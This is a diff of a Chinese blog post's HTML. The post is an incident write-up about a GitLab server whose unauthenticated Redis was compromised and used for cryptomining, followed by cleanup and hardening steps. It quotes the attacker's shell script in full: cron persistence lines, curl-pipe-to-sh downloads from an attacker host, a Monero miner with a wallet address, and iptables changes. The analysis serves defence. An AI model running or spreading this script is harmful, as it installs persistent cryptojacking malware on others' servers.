@@ -1,63 +1,198 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
+<!-- Head tag -->
 <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<meta name="theme-color" content="#33474d">
-	<title>gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？ | Yancy&#39;s blog</title>
-	<link rel="stylesheet" href="/css/style.css" />
-	
-      <link rel="alternate" href="/atom.xml" title="Yancy&#39;s blog" type="application/atom+xml">
-    
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Personal blog, thinking and sharing of technology and life">
+    <meta name="keyword"  content="undefined">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？ - Yancy&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://blog.yancy.cc/2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
 
-<body>
 
-	<header class="header">
-		<nav class="header__nav">
-			
-				<a href="/" class="header__link">Home</a>
-			
-				<a href="/tags" class="header__link">Tags</a>
-			
-				<a href="/archives" class="header__link">ARCHIVES</a>
-			
-				<a href="/about/About" class="header__link">ABOUT</a>
-			
-				<a href="http://weibo.com/yangcvo" class="header__link">Weibo</a>
-			
-				<a href="/atom.xml" class="header__link">RSS</a>
-			
-		</nav>
-		<h1 class="header__title"><a href="/">Yancy&#39;s blog</a></h1>
-		<h2 class="header__subtitle">SIMPLICITY IS PREREQUISITE FOR  RELIABILITY</h2>
-	</header>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
 
-	<main>
-		<article>
-	
-		<h1>gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？</h1>
-	
-	<div class="article__infos">
-		<span class="article__date">2016-12-02</span><br />
-		
-			<span class="article__category">
-				<a class="article-category-link" href="/categories/运维安全/">运维安全</a>
-			</span><br />
-		
-		
-			<span class="article__tags">
-			  	<a class="article__tag-link" href="/tags/Operation-safety/">Operation safety</a>
-			</span>
-		
-	</div>
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Yancy&#39;s blog</a>
+        </div>
 
-	
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
 
-	
-		<p>今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。<br>毕竟这个关乎着开发今天可能无法提交代码。</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png" alt=""></figure></p>
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/ABOUT/About.html">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/ARCHIVES/archives.html">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="http://blog.yancy.cc/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Operation safety" title="Operation safety">Operation safety</a>
+                        
+                    </div>
+                    <h1>gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by Yancy on
+                        2016-12-02
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。<br>毕竟这个关乎着开发今天可能无法提交代码。</p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png" alt=""><br><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png" alt=""></p>
 <h4 id="第一时间我查看什么原因导致我gitlab-500。"><a href="#第一时间我查看什么原因导致我gitlab-500。" class="headerlink" title="第一时间我查看什么原因导致我gitlab 500。"></a>第一时间我查看什么原因导致我gitlab 500。</h4><p>根据以往经验gitlab出现500 第一：版本出现bug，第二：服务器网络不正常，请求不到。</p>
 <p>然后查看日志：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@GitLab ~]<span class="comment"># tailf -1000 /home/git/gitlab/log/production.log</span></div><div class="line"></div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:26 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:31 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:37 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:14:42 +0800</div><div class="line">Started POST <span class="string">"//api/v3/internal/allowed"</span> <span class="keyword">for</span> 139.129.22.17 at 2017-01-06 10:15:35 +0800</div><div class="line">Started GET <span class="string">"/"</span> <span class="keyword">for</span> 177.154.56.233 at 2017-01-06 10:15:55 +0800</div><div class="line">Processing by DashboardController<span class="comment">#show as */*</span></div><div class="line">Completed 401 Unauthorized <span class="keyword">in</span> 55ms</div><div class="line"></div><div class="line">Redis::CommandError (NOAUTH Authentication required.):</div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:<span class="keyword">in</span> `block <span class="keyword">in</span> setex<span class="string">'</span></div><div class="line">  config/initializers/redis-store-fix-expiry.rb:10:in `setter’</div></pre></td></tr></table></figure>
@@ -65,45 +200,45 @@
 <p>因为redis服务在2016年3月份官网发布了一项通知：使用redis主要设置密码。<br>可以看下这篇文章：</p>
 <p><a href="http://www.oschina.net/news/67975/redis-defect?from=mail-notify" target="_blank" rel="external">Redis 未授权访问缺陷可轻易导致系统被黑</a></p>
 <p>全球无验证可直接利用 Redis TOP 10 国家与地区</p>
-<p><figure class="figure"><img src="http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg" alt=""></figure></p>
+<p><img src="http://static.oschina.net/uploads/space/2015/1112/131046_hoNL_865233.jpg" alt=""></p>
 <p>解决方案</p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">临时解决方案                            </div><div class="line"></div><div class="line">配置<span class="keyword">bind选项, </span>限定可以连接Redis服务器的IP, 并修改redis的默认端口<span class="number">6379</span>.</div><div class="line"></div><div class="line">配置AUTH, 设置密码, 密码会以明文方式保存在redis配置文件中.</div><div class="line"></div><div class="line">配置rename-command <span class="built_in">CONFIG</span> <span class="string">"RENAME_CONFIG"</span>, 这样即使存在未授权访问, 也能够给攻击者使用<span class="built_in">config</span>指令加大难度</div><div class="line"></div><div class="line">好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如<span class="built_in">config</span></div><div class="line"></div><div class="line">官方解决方案                            </div><div class="line"></div><div class="line">暂无官方解决方案</div></pre></td></tr></table></figure>
 <p>现在版本gitlab 7.0版本的没有redis设置密码一项，所以就觉得奇怪，为什么会有人设置了密码，网站导致获取不到数据就出现500了。</p>
 <h4 id="查找原因：什么原因导致CPU一直100"><a href="#查找原因：什么原因导致CPU一直100" class="headerlink" title="查找原因：什么原因导致CPU一直100%"></a>查找原因：什么原因导致CPU一直100%</h4><p>首先SSH登陆，top查看进程，发现奇怪名字的命令AnXqV, ddg.217隐藏进程。 还有一看就感觉有问题。</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png" alt=""></figure></p>
-<p>知道这个进程然后我们单独看下这个进程具体有哪些：<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_03.png" alt=""></p>
+<p>知道这个进程然后我们单独看下这个进程具体有哪些：<br><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_04.png" alt=""></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof –c ddg.217</div></pre></td></tr></table></figure>
 <p>查看关联文件，发现对外的tcp连接，不知道是不是反向shell…</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_05.png" alt=""></p>
 <p>从这里明显可以看的出来，我的redis-6379 被人拿到shell权限了。</p>
 <p>从上面可以看到：</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png" alt=""></figure></p>
-<p>这里我到/root/.ddg/17.db这个文件我打开看是乱码加密过的。<br>加密的 看不到数据。<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_06.png" alt=""></p>
+<p>这里我到/root/.ddg/17.db这个文件我打开看是乱码加密过的。<br>加密的 看不到数据。<br><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_07.png" alt=""></p>
 <h6 id="这里第一步删除第一个病毒文件和加权限位："><a href="#这里第一步删除第一个病毒文件和加权限位：" class="headerlink" title="这里第一步删除第一个病毒文件和加权限位："></a>这里第一步删除第一个病毒文件和加权限位：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rm -rf /root/.ddg  删除依赖。他依赖于哪个文件，然后给加一个权限位：chattr  +s  filename</div><div class="line">删除掉了 你手动创建，然后加权限位。</div></pre></td></tr></table></figure>
 <h6 id="第二步分析下面IP地址："><a href="#第二步分析下面IP地址：" class="headerlink" title="第二步分析下面IP地址："></a>第二步分析下面IP地址：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">139.222.173.127</div><div class="line">139.70.199.90</div><div class="line">.....</div><div class="line">后面就不用解释了，这个明显当`肉鸡`了。</div></pre></td></tr></table></figure>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_08.png" alt=""></p>
 <p>临时方法防火墙配置屏蔽这些IP地址。 治标不治本、</p>
 <p>这里解决掉<code>12506</code>进程：kill -9 12506</p>
 <p>配置 一个hosts  </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10.0.1.110   www.haveabitchin.com  配置成 百度的ip</div></pre></td></tr></table></figure>
 <p>帮他配错地址,他肯定请求下载 不到这个脚本了.</p>
 <p>然后按进程程序目录下面进入/tmp/删除 ddg.217文件，删除duchduckgo.17.log 这个是病毒运行进程输出的日志文件，<br>删除hsperfadata_root 这个文件里面是个进程，也删除。</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png" alt=""></figure></p>
-<p>然后在看看是否还有没有这个进程：<br>又启动<code>13929</code>这个进程，服务还是占用很高资源CPU：100%<br>定位到是哪个程序 发起的请求.查看：<code>13918</code>这个进程：<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_09.png" alt=""></p>
+<p>然后在看看是否还有没有这个进程：<br>又启动<code>13929</code>这个进程，服务还是占用很高资源CPU：100%<br>定位到是哪个程序 发起的请求.查看：<code>13918</code>这个进程：<br><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_10.png" alt=""></p>
 <p>从这里明显可以看出来，这个地址：</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/bin/</span>sh -c curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/pm.sh?0105008 | sh</span></div><div class="line">curl -fsSL <span class="string">http:</span><span class="comment">//www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217</span></div></pre></td></tr></table></figure>
 <p>这个明显是哪个程序一直在启动。</p>
 <h5 id="第三步继续排查："><a href="#第三步继续排查：" class="headerlink" title="第三步继续排查："></a>第三步继续排查：</h5><p>删除这些发现还是CPU百分百：<br>在继续查看进程：</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_11.png" alt=""></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root     26373     1 96 Jan01 ?        4-12:14:03 ./minerd -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x</div></pre></td></tr></table></figure>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_12.png" alt=""></p>
 <p>这个进程是什么：mined 百度告诉我们了: <a href="https://zhidao.baidu.com/question/1928020622935195267.html" target="_blank" rel="external">mined肉鸡木马</a> 很吃CPU一种病毒。</p>
 <h5 id="第一步解决定位木马："><a href="#第一步解决定位木马：" class="headerlink" title="第一步解决定位木马："></a>第一步解决定位木马：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -name minerd</div></pre></td></tr></table></figure>
 <p>在服务器搜索所有相关minerd文件。<br>搜索到了这个文件放在我们/home/目录下面。</p>
-<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png" alt=""></figure></p>
+<p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png" alt=""></p>
 <h5 id="第二步删除木马："><a href="#第二步删除木马：" class="headerlink" title="第二步删除木马："></a>第二步删除木马：</h5><p>查看计划任务是否有启动：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@GitLab tmp]<span class="comment"># cronte -e</span></div><div class="line">*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh</div></pre></td></tr></table></figure>
-<h5 id="服务器恢复正常："><a href="#服务器恢复正常：" class="headerlink" title="服务器恢复正常："></a>服务器恢复正常：</h5><p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png" alt=""></figure></p>
+<h5 id="服务器恢复正常："><a href="#服务器恢复正常：" class="headerlink" title="服务器恢复正常："></a>服务器恢复正常：</h5><p><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png" alt=""></p>
 <p>我这里就贴出了这个木马的脚本内容：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.217"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217</div><div class="line">killall /tmp/ddg.216</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-d</span> <span class="string">"/opt/yam"</span> ]; <span class="keyword">then</span></div><div class="line">    rm -rf /opt/yam</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep /tmp/duckduckgo|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/bin/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line">▽</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/sbin/ntp"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/minerd"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line"><span class="comment">#/opt/minerd -h</span></div><div class="line"><span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">    <span class="comment">#ps auxf|grep -v grep|grep "/opt/minerd"</span></div><div class="line">    <span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">        <span class="comment">#if [ ! -f /opt/yam ]; then</span></div><div class="line">            <span class="comment">#curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam</span></div><div class="line">        <span class="comment">#fi</span></div><div class="line">        <span class="comment">#chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr</span></div><div class="line">    <span class="comment">#fi</span></div><div class="line"><span class="comment">#fi</span></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoMiner</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/AnXqV"</span> ]; <span class="keyword">then</span></div><div class="line">        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV</div><div class="line">    <span class="keyword">fi</span></div><div class="line">    chmod +x /tmp/AnXqV</div><div class="line">    /tmp/AnXqV -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND<span class="built_in">fg</span>MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x</div><div class="line">&#125;</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"</span> || DoMiner</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoRedis6379</span></span>()</div><div class="line">&#123;</div><div class="line">    iptables -F REDIS6379</div><div class="line">    iptables -A REDIS6379 -p tcp <span class="_">-s</span> 127.0.0.1 --dport 6379 -j ACCEPT</div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT</div><div class="line">    iptables -I INPUT -j REDIS6379</div><div class="line">&#125;</div><div class="line">iptables -D OUTPUT -j REDIS6379</div><div class="line">iptables -F REDIS6379</div><div class="line">iptables -X REDIS6379</div><div class="line">iptables -D INPUT -j REDIS63792</div><div class="line">iptables -F REDIS63792</div><div class="line">iptables -X REDIS63792</div><div class="line"><span class="comment">#iptables -N REDIS6379 &amp;&amp; DoRedis6379</span></div></pre></td></tr></table></figure>
 <p>分析了一下，它除了自身进程外，还有3个守护进程，而且这5个进程的PID和名称每秒都在变化，估计是在不停的重建吧。</p>
@@ -120,52 +255,272 @@
 <p>总结：</p>
 <p>这次发生破灭性的攻击，总结经验这里gitlab走redis单独走本地：设置：bind单独本地跑。127.0.0.1 第二：普通用户启动redis，第三：设置防火墙。 </p>
 
-	
 
-	
-		<span class="different-posts"><a href="/2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/" onclick="window.history.go(-1); return false;">⬅️ Go back </a></span>
+                <hr>
 
-	
+                
 
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2016/12/02/Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验/" data-toggle="tooltip" data-placement="top" title="记录tomcat进程CPU使用率高排查故障经验">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2016/11/24/Node.js-npm/Node.js-Grunt工具搭建后台管理实践/" data-toggle="tooltip" data-placement="top" title="Node.js+Grunt工具搭建后台管理实践">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+		 
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Operation safety" title="Operation safety">Operation safety</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://openskill.cn/" target="_blank">openskill.cn</a></li>
+                    
+                        <li><a href="http://yuzhouwan.com/" target="_blank">Benedict Jin&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
 </article>
 
-	</main>
-
-	<footer class="footer">
-	<div class="footer-content">
-		
-	      <div class="footer__element">
-	<h5>Hi there,</h5>
-	<p style="text-align:justify;">my name is Yancy, they know me as Radiant🐑🐑. This blog is about Bi-data and my live.<br> I like 🌳🌳🌳</p>
-</div>
 
 
-	    
-	      <div class="footer__element">
-	<h5>Check out</h5>
-	<ul class="footer-links">
